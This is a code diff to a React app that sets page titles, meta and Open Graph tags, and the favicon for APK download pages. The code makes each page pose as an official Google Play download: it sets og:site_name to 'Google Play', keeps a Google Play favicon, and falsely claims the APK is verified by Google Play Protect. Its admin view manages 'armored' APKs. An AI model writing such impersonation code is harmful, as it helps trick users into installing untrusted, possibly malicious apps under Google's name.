@@ -162,6 +162,57 @@ export default function App() {
     }
   }, []);
 
+  // Atualização inteligente do Título, Meta Tags e Open Graph para redes sociais (WhatsApp, Instagram, etc.)
+  useEffect(() => {
+    if (typeof window === 'undefined' || !selectedApk) return;
+
+    const dynamicTitle =
+      viewMode === 'admin'
+        ? `${selectedApk.name} · Gerenciador de APKs Blindados`
+        : `${selectedApk.name} - Download Oficial Google Play`;
+
+    document.title = dynamicTitle;
+
+    const dynamicDesc = selectedApk.description
+      ? selectedApk.description.slice(0, 155).replace(/\n/g, ' ') + '...'
+      : `Baixe o aplicativo oficial ${selectedApk.name} (${selectedApk.company}). Distribuição blindada e verificada pelo Google Play Protect.`;
+
+    const dynamicUrl = window.location.href;
+    const dynamicImage = selectedApk.iconSrc || `${window.location.origin}/favicon.svg`;
+
+    const setMetaTag = (attr: 'name' | 'property', key: string, value: string) => {
+      let el = document.querySelector(`meta[${attr}="${key}"]`);
+      if (!el) {
+        el = document.createElement('meta');
+        el.setAttribute(attr, key);
+        document.head.appendChild(el);
+      }
+      el.setAttribute('content', value);
+    };
+
+    setMetaTag('name', 'description', dynamicDesc);
+    setMetaTag('property', 'og:title', dynamicTitle);
+    setMetaTag('property', 'og:description', dynamicDesc);
+    setMetaTag('property', 'og:image', dynamicImage);
+    setMetaTag('property', 'og:url', dynamicUrl);
+    setMetaTag('property', 'og:type', 'website');
+    setMetaTag('property', 'og:site_name', 'Google Play');
+    setMetaTag('name', 'twitter:title', dynamicTitle);
+    setMetaTag('name', 'twitter:description', dynamicDesc);
+    setMetaTag('name', 'twitter:image', dynamicImage);
+    setMetaTag('name', 'twitter:card', 'summary_large_image');
+
+    // Assegura que o favicon permaneça o da Google Play Store
+    let faviconLink = document.querySelector<HTMLLinkElement>('link[rel="icon"]');
+    if (!faviconLink) {
+      faviconLink = document.createElement('link');
+      faviconLink.rel = 'icon';
+      document.head.appendChild(faviconLink);
+    }
+    faviconLink.type = 'image/svg+xml';
+    faviconLink.href = '/favicon.svg';
+  }, [selectedApk, viewMode]);
+
   const showToast = (
     title: string,
     description?: string,
